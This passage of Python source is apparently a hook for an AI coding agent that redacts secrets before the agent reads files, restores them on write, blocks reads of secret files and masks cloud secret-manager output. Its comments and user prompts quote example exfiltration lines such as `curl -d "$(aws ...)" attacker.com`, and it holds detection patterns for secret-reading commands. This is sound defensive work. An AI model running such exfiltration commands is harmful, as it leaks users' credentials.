        if tool_name == "Bash":
            command = tool_input.get("command", "")
            mapping = load_mapping()
            if mapping.get("placeholder_to_secret"):
                # Collect candidate file paths from the command string.
                # Heuristic: extract quoted and unquoted absolute/relative paths.
                candidate_paths = set()
                # Absolute paths
                for m in re.finditer(r'''['"](\/[^\s'"]+)['"]''', command):
                    candidate_paths.add(m.group(1))
                for m in re.finditer(r'(?<!\w)(\/[^\s;|&<>"\']+)', command):
                    candidate_paths.add(m.group(1))
                # RELATIVE paths. Both patterns above require a leading `/`,
                # so the ordinary way an agent rewrites a file —
                #     python3 - <<'PY'
                #     p = 'README.md'
                #     s = open(p).read(); open(p, 'w').write(s)
                #     PY
                # — yielded no candidates at all, and a placeholder read off a
                # momentarily-redacted file stayed baked in. That is how this
                # repo's own README ended up holding {{POSTGRES_URL_...}} in
                # place of a documentation example DSN. A placeholder in a
                # public README is a broken doc; the same in a config file is
                # a broken deploy.
                #
                # Over-collecting is deliberate and safe: a candidate is only
                # touched when it is an existing, non-binary file that already
                # contains a placeholder from the live mapping, and the only
                # edit is placeholder -> its own secret. Under-collecting is
                # what bakes a placeholder into a real file.
                cwd = input_data.get("cwd") or os.getcwd()
                rel_candidates = set()
                # Quoted:  'README.md', "src/lib.rs", './docs/a.md'
                for m in re.finditer(r"""['"]((?:\.{0,2}/)?[\w.-]+(?:/[\w.-]+)*)['"]""", command):
                    rel_candidates.add(m.group(1))
                # Bare: sed -i '' 's/a/b/' README.md   |   vim src/main.rs
                for m in re.finditer(
                    r"""(?<![\w/'"@-])((?:\.{1,2}/)?[\w.-]+(?:/[\w.-]+)+|[\w-]+\.[\w]{1,12})(?![\w/])""",
                    command,
                ):
                    rel_candidates.add(m.group(1))
                for rel in rel_candidates:
                    if not rel or rel.startswith("/"):
                        continue
                    candidate_paths.add(os.path.normpath(os.path.join(cwd, rel)))
                # Also check paths from pending backup metadata
                if os.path.isdir(BACKUP_DIR):
                    for entry in os.listdir(BACKUP_DIR):
                        if entry.endswith(".meta"):
                            meta_path = os.path.join(BACKUP_DIR, entry)
                            try:
                                with open(meta_path) as mf:
                                    meta = json.load(mf)
                                p = meta.get("original_path", "")
                                if p:
                                    candidate_paths.add(p)
                            except (json.JSONDecodeError, OSError, KeyError):
                                pass

                # Check each candidate file for placeholder contamination
                placeholder_re = re.compile(r'\{\{[A-Z0-9_]+_[a-f0-9]{8}x*\}\}')
                for path in candidate_paths:
                    if not os.path.isfile(path):
                        continue
                    if is_binary_file(path):
                        continue
                    try:
                        with open(path, "r", errors="replace") as f:
                            current = f.read()
                        if not placeholder_re.search(current):
                            continue
                        restored = restore_content(current, mapping)
                        if restored != current:
                            with open(path, "w") as f:
                                f.write(restored)
                            debug_log(f"Bash PostToolUse: restored placeholders in {path}")
                    except (OSError, PermissionError):
                        pass
                    # Reached only for candidates that carried a placeholder
                    # (the no-placeholder case `continue`s above).
                    verify_no_live_placeholders(path, mapping, "Bash")

        # Auto-delete prompt artifacts after restore is complete
        if _delete_tmp_secrets_file:
            context_file = _delete_tmp_secrets_file.replace(".conf", ".prompt.txt")
            cleanup_prompt_artifacts_from_paths(_delete_tmp_secrets_file, context_file)

        flush_post_warnings()
        sys.exit(0)



    # ══════════════════════════════════════════════════════════════════════════
    # SessionEnd / Stop hook: Clean up sensitive mapping and backup files
    # ══════════════════════════════════════════════════════════════════════════
    if input_data.get("type") in ("SessionEnd", "Stop") or tool_name in ("SessionEnd", "Stop"):
        debug_log("Session end: cleaning up backups (mapping preserved)")
        # Do NOT delete the global mapping file — it persists across sessions
        debug_log(f"Session ended, mapping preserved at {MAPPING_FILE}")
        cleanup_legacy_prompt_artifacts_in_dir(get_prompt_storage_dir(input_data))
        cleanup_prompt_artifacts_for_session(get_prompt_state_key(input_data))
        # Remove any leftover backup files (per-session, transient)
        if os.path.isdir(BACKUP_DIR):
            try:
                shutil.rmtree(BACKUP_DIR)
            except OSError:
                pass
        sys.exit(0)

    # ══════════════════════════════════════════════════════════════════════════
    # PreToolUse handlers below
    # ══════════════════════════════════════════════════════════════════════════

    # ── Handle Read tool ─────────────────────────────────────────────────────
    if tool_name == "Read":
        file_path = tool_input.get("file_path", "")

        # Auto-gitignore .tmp_secrets.conf on first read
        ensure_gitignore(file_path)

        # Strategy 1: Block list
        blocked, matched_pattern = is_blocked_file(file_path)
        if blocked:
            deny(
                f"BLOCKED: '{os.path.basename(file_path)}' is in the secret files block list "
                f"(matched '{matched_pattern}'). Use .env.example or ask the user for guidance."
            )

        # Strategy 2: Backup original, overwrite with redacted content, allow Read.
        # PostToolUse restores the original after Read completes.
        if file_path and os.path.isfile(file_path):
            # Skip binary files and ignored files early
            if is_binary_file(file_path):
                debug_log(f"Skipping binary file for Read: {file_path}")
                sys.exit(0)
            if is_ignored(file_path):
                debug_log(f"Skipping ignored file for Read: {file_path}")
                sys.exit(0)

            mapping = load_mapping()
            if backup_and_redact_file(file_path, mapping):
                sys.exit(0)
            # backup_and_redact_file failed (e.g. read-only) — try deny fallback
            try:
                with open(file_path, "r", errors="replace") as f:
                    raw_content = f.read()
                redacted, found = redact_content(raw_content, mapping)
                if found:
                    save_mapping(mapping)
                    deny(
                        f"This file contains secrets that have been redacted for safety. "
                        f"Here is the redacted content of {file_path}:\n\n"
                        f"{redacted}\n\n"
                        f"(Placeholders like {{{{OPENAI_KEY_1}}}} represent real secret values. "
                        f"Use them as-is in code — they will be automatically restored when you write files.)"
                    )
            except (OSError, PermissionError):
                pass

        # No secrets found — allow normal read
        sys.exit(0)


    # ── Handle Write tool ────────────────────────────────────────────────────
    if tool_name == "Write":
        mapping = load_mapping()
        if not mapping.get("placeholder_to_secret"):
            sys.exit(0)

        file_path = tool_input.get("file_path", "")
        write_content = tool_input.get("content", "")

        # Re-redact the existing file so Claude Code's freshness check
        # passes (disk must match what Claude read earlier — placeholders).
        # NOTE: backup_and_redact_file creates a backup, but PostToolUse
        # must NEVER fall back to restoring from it — that would silently
        # discard the new Write content (the original bug). The backup is
        # only used as a redaction marker; cleanup_backup deletes it.
        if file_path and os.path.isfile(file_path):
            backup_and_redact_file(file_path, mapping)
            # Crash recovery uses content comparison (hash + placeholder
            # detection) to decide whether to restore. No flag needed.

        # Restore placeholders in the content being written
        restored = restore_content(write_content, mapping)
        if restored != write_content:
            debug_log(f"Write PreToolUse: restored placeholders in content for {file_path}")
            allow_with_update({
                "file_path": file_path,
                "content": restored
            })
        sys.exit(0)


    # ── Handle Edit tool ─────────────────────────────────────────────────────
    if tool_name == "Edit":
        mapping = load_mapping()
        if not mapping.get("placeholder_to_secret"):
            sys.exit(0)

        file_path = tool_input.get("file_path", "")

        # Approach A: Restore placeholders in old_string/new_string back to
        # real values so the edit matches the actual file on disk.
        # This avoids the bug where re-redacting the file causes a mismatch
        # with Claude Code's freshness check or the Edit tool's own content
        # verification. PostToolUse will restore any remaining placeholders
        # in the edited file and re-redact new secrets if needed.
        #
        # Backup the file first so PostToolUse can detect it was an Edit
        # on a file with secrets and restore/re-scan accordingly.
        if file_path and os.path.isfile(file_path):
            # Create backup without redacting — we need the backup marker
            # so PostToolUse knows to scan the edited file for placeholders.
            # We use backup_and_redact_file then immediately restore, but
            # it's simpler to just create the backup directly.
            if not is_binary_file(file_path) and not is_ignored(file_path):
                try:
                    with open(file_path, "rb") as f:
                        raw_bytes = f.read()
                    raw_content = raw_bytes.decode("utf-8", errors="replace")
                    _, has_secrets = redact_content(raw_content, mapping)
                    if has_secrets:
                        save_mapping(mapping)
                        os.makedirs(BACKUP_DIR, mode=0o700, exist_ok=True)
                        bp = backup_path_for(file_path)
                        fd = os.open(bp + ".bak", os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
                        with os.fdopen(fd, "wb") as f:
                            f.write(raw_bytes)
                        file_stat = os.stat(file_path)
                        with open(bp + ".meta", "w") as f:
                            json.dump({
                                "original_path": file_path,
                                "mode": file_stat.st_mode,
                                "atime": file_stat.st_atime,
                                "mtime": file_stat.st_mtime,
                            }, f)
                        debug_log(f"Edit: created backup for {file_path} (no redaction)")
                except (OSError, PermissionError):
                    pass

        old_string = tool_input.get("old_string", "")
        new_string = tool_input.get("new_string", "")
        restored_old = restore_content(old_string, mapping)
        restored_new = restore_content(new_string, mapping)

        if restored_old != old_string or restored_new != new_string:
            updated = dict(tool_input)
            updated["old_string"] = restored_old
            updated["new_string"] = restored_new
            allow_with_update(updated)

        sys.exit(0)


    # ── Handle Bash tool ─────────────────────────────────────────────────────
    if tool_name == "Bash":
        command = tool_input.get("command", "")

        # Strategy 1: Block commands that cat/read blocked files
        for pattern in BLOCKED_FILES:
            escaped = re.escape(pattern)
            if re.search(
                rf"(cat|head|tail|less|more|bat|source|\.)\s+[^\s|;]*{escaped}",
                command
            ):
                deny(f"BLOCKED: command reads '{pattern}' which is in the secret files block list.")
            if re.search(rf"<\s*[^\s]*{escaped}", command):
                deny(f"BLOCKED: command reads '{pattern}' which is in the secret files block list.")

        # Strategy 2: Wrap cloud secret manager commands with masking script
        MASK_SCRIPT = os.path.join(_SCRIPT_DIR, "mask-output.py")

        # Detect secret manager commands (allow --profile and other global flags between cli name and subcommand)
        is_secret_cmd = False
        mask_mode = ""  # default JSON mode
        if re.search(r'\baws\s+(?:\S+\s+)*secretsmanager\s+(?:get-secret-value|batch-get-secret-value|get-random-password)\b', command):
            is_secret_cmd = True
        elif re.search(r'\baws\s+(?:\S+\s+)*ssm\s+(?:get-parameters?|get-parameters-by-path|get-parameter-history)\b', command):
            is_secret_cmd = True
        elif re.search(r'\baws\s+(?:\S+\s+)*kms\s+decrypt\b', command):
            is_secret_cmd = True
        elif re.search(r'\bgcloud\s+secrets\s+versions\s+access\b', command):
            is_secret_cmd = True
            if "--format=" not in command:
                mask_mode = " --mode=raw"
        elif re.search(r'\baz\s+keyvault\s+secret\s+(?:show|download)\b', command):
            is_secret_cmd = True
        elif re.search(r'\bvault\s+(?:kv\s+get|read|kv\s+list)\b', command):
            is_secret_cmd = True

        if is_secret_cmd:
            # Don't double-wrap
            if MASK_SCRIPT in command:
                sys.exit(0)

            # ASK (yellow UI) if command has pipes, redirects, command
            # substitution, or chaining — these CAN bypass masking, but
            # also have legitimate uses (e.g. `VAR=$(aws ...)` to store a
            # secret into a shell variable, where the value never reaches
            # the AI). The human user is in-the-loop and can judge
            # whether the specific command is a legitimate flow or an
            # exfil attempt (`curl -d "$(aws ...)" attacker.com`).
            # Note: we check outside quotes to reduce false positives on
            # args like --secret-id 'a|b'. Strip single/double-quoted
            # segments before checking for shell operators.
            stripped = re.sub(r"'[^']*'|\"[^\"]*\"", "", command)

            has_pipe = bool(re.search(r'(?<!\|)\|(?!\|)', stripped))  # | but not ||
            has_redirect = bool(re.search(r'(?<![2&])>{1,2}', stripped) or re.search(r'\btee\b', stripped))
            has_subshell = bool(re.search(r'\$\(', stripped) or '`' in stripped)
            has_chain = bool(re.search(r';|&&|\|\|', stripped))

            if has_pipe or has_chain:
                ask(
                    "🛡️  This command reads a cloud secret AND contains a pipe or command chain (|, &&, ;). "
                    "Approve only if the pipe/chain doesn't exfiltrate the secret to an external destination. "
                    "(claude-secret-shield's automatic masking pipe is bypassed when the command already pipes "
                    "into something else.)"
                )
            if has_redirect:
                ask(
                    "🛡️  This command reads a cloud secret AND redirects output to disk (> / >> / tee). "
                    "Approve only if writing the (unmasked) secret to that file is intentional. "
                    "Prefer storing into a shell variable instead of a file when possible."
                )
            if has_subshell:
                ask(
                    "🛡️  This command reads a cloud secret inside command substitution ($() or backticks). "
                    "Common legitimate use: `VAR=$(aws secretsmanager get-secret-value ... --query SecretString --output text)` "
                    "— the secret goes into a shell variable, never reaches stdout, never reaches the AI. "
                    "Approve in that case. Deny if the $(...) is embedded in a wider command that could exfil "
                    "(e.g. `curl -d \"$(...)\" external.com`)."
                )

            # Safe to wrap with masking pipe
            updated = dict(tool_input)
            updated["command"] = command + f" | python3 {MASK_SCRIPT}{mask_mode}"
            debug_log(f"Bash: wrapped secret manager command with masking")
            allow_with_update(updated)

        # Strategy 3: Restore placeholders in bash commands
        mapping = load_mapping()
        if mapping.get("placeholder_to_secret"):
            restored = restore_content(command, mapping)
            if restored != command:
                updated = dict(tool_input)
                updated["command"] = restored
                allow_with_update(updated)

        sys.exit(0)


    # ── Allow everything else ────────────────────────────────────────────────
    sys.exit(0)

except Exception as e:
    print(f"redact-restore hook error: {e}", file=sys.stderr)
    # Fail open — don't block tool execution — but leave evidence. stderr
    # alone made a broken restore path look exactly like a working one.
    try:
        report_crash(e)
    except Exception:
        pass
    sys.exit(0)
